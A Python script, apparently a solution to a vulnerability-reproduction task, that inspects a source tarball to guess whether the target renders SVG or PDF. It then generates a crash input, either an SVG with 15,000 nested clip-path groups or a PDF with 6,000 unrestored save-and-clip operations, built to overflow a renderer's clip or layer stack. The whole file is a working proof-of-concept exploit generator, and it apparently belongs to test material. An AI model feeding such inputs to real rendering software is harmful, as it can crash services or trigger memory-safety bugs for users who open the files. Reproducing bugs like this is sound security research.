import os
import tarfile
from typing import List


def detect_format_from_tar(src_path: str) -> str:
    # Heuristic: decide whether the project likely parses SVG or PDF
    # Default to SVG if uncertain, as the described bug seems typical for SVG renderers.
    svg_keywords = (
        "svg", "resvg", "usvg", "nanosvg", "tiny-skia",
        "svgren", "skia_svg", "svgdom", "svgpp", "svgo"
    )
    pdf_keywords = (
        "pdf", "pdfium", "poppler", "mupdf", "xpdf", "pdfbox"
    )

    svg_score = 0
    pdf_score = 0
    skia_score = 0

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                name = (m.name or "").lower()
                if not name:
                    continue
                # Count file name mentions
                for kw in svg_keywords:
                    if kw in name:
                        svg_score += 1
                for kw in pdf_keywords:
                    if kw in name:
                        pdf_score += 1
                if "skia" in name:
                    skia_score += 1
    except Exception:
        # If anything goes wrong, default to svg
        return "svg"

    # If it looks like an SVG-related repo, prefer SVG
    if svg_score >= pdf_score:
        return "svg"
    # Otherwise try PDF
    return "pdf"


def generate_svg_poc(nesting: int) -> bytes:
    # Build an SVG with deeply nested groups each applying the same clip-path.
    # This stresses the clip stack independently of layer stack depth.
    # Keep it simple and valid.
    header = [
        '<?xml version="1.0" encoding="UTF-8"?>\n',
        '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">\n',
        '  <defs>\n',
        '    <clipPath id="c">\n',
        '      <rect x="0" y="0" width="200" height="200"/>\n',
        '    </clipPath>\n',
        '  </defs>\n'
    ]
    body_open = []
    open_tag = '<g clip-path="url(#c)">\n'
    close_tag = '</g>\n'

    # Open nested groups
    body_open.append(open_tag * nesting)

    # Add a small drawable to ensure there is content.
    leaf = '  <rect x="10" y="10" width="1" height="1" fill="black"/>\n'

    # Close nested groups
    body_close = [close_tag * nesting]

    footer = ['</svg>\n']

    parts: List[str] = []
    parts.extend(header)
    parts.extend(body_open)
    parts.append(leaf)
    parts.extend(body_close)
    parts.extend(footer)
    return "".join(parts).encode("utf-8")


def generate_pdf_poc(depth: int) -> bytes:
    # Minimal valid PDF generator with a content stream that
    # performs many clip operations combined with save state.
    # This can stress clip/layer stack handling in some PDF renderers.
    def pdf_obj(obj_num: int, data: str) -> bytes:
        return f"{obj_num} 0 obj\n{data}\nendobj\n".encode("latin-1")

    content_lines = []
    # Build many save+clip operations
    # Each iteration:
    #   q                      save graphics state
    #   0 0 200 200 re        define a rectangle path
    #   W n                   set as clipping path and end path
    # Repeat without restoring to push depth
    pat = "q\n0 0 200 200 re\nW n\n"
    content_lines.append(pat * depth)
    # A small draw to keep content non-empty
    content_lines.append("0 0 1 rg\n0 0 10 10 re f\n")
    content_stream = "".join(content_lines).encode("latin-1")

    objects: List[bytes] = []

    # 1: Catalog
    objects.append(pdf_obj(1, "<< /Type /Catalog /Pages 2 0 R >>"))
    # 2: Pages
    objects.append(pdf_obj(2, "<< /Type /Pages /Count 1 /Kids [3 0 R] >>"))
    # 3: Page
    page_dict = (
        "<< /Type /Page /Parent 2 0 R "
        "/MediaBox [0 0 200 200] "
        "/Contents 4 0 R "
        "/Resources << >> >>"
    )
    objects.append(pdf_obj(3, page_dict))
    # 4: Content stream
    stream_dict = f"<< /Length {len(content_stream)} >>\nstream\n".encode("latin-1")
    stream_end = b"\nendstream\n"
    obj4 = b"4 0 obj\n" + stream_dict + content_stream + stream_end + b"endobj\n"
    objects.append(obj4)

    # Build PDF with proper xref
    out = bytearray()
    out.extend(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")
    offsets = [0]  # object 0 is the free object
    out_offsets = []

    # Write objects and record offsets
    for obj in objects:
        offsets.append(len(out))
        out.extend(obj)

    # xref
    xref_offset = len(out)
    n_obj = len(objects) + 1
    out.extend(f"xref\n0 {n_obj}\n".encode("latin-1"))
    # Free object
    out.extend(b"0000000000 65535 f \n")
    for off in offsets[1:]:
        out.extend(f"{off:010d} 00000 n \n".encode("latin-1"))

    # trailer
    trailer = (
        f"trailer\n<< /Size {n_obj} /Root 1 0 R >>\nstartxref\n{xref_offset}\n%%EOF\n"
    ).encode("latin-1")
    out.extend(trailer)
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = detect_format_from_tar(src_path)
        # Choose nesting/depth aiming at reasonably small PoC while likely triggering the issue.
        if fmt == "svg":
            # Nesting level chosen to exceed typical layer/clip stack capacities without being too slow
            return generate_svg_poc(nesting=15000)
        else:
            # PDF depth chosen to be large but not excessively huge
            return generate_pdf_poc(depth=6000)